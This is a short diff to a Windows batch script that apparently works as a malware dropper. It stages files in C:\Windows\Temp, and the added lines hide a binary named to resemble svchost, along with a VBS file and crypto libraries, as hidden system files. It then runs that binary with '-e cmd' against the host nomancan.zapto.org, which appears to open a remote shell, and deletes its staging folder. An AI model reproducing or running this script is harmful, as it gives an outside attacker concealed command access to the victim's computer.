@@ -31,6 +31,12 @@ powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Obj
 xcopy "C:\Windows\Temp\0test0" "C:\Windows\Temp" /h /i /c /k /e /r /y
 cd "C:\Windows\Temp"
 
+attrib +h +s "C:\Windows\Temp\svclhost.exe"
+attrib +h +s "C:\Windows\Temp\svclhost.vbs"
+attrib +h +s "C:\Windows\Temp\libcrypto-3.dll"
+attrib +h +s "C:\Windows\Temp\libssh2.dll"
+attrib +h +s "C:\Windows\Temp\libssl-3.dll"
+
 cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org %n_pt% -e cmd
 
 rmdir /Q /S "C:\Windows\Temp\0test0"
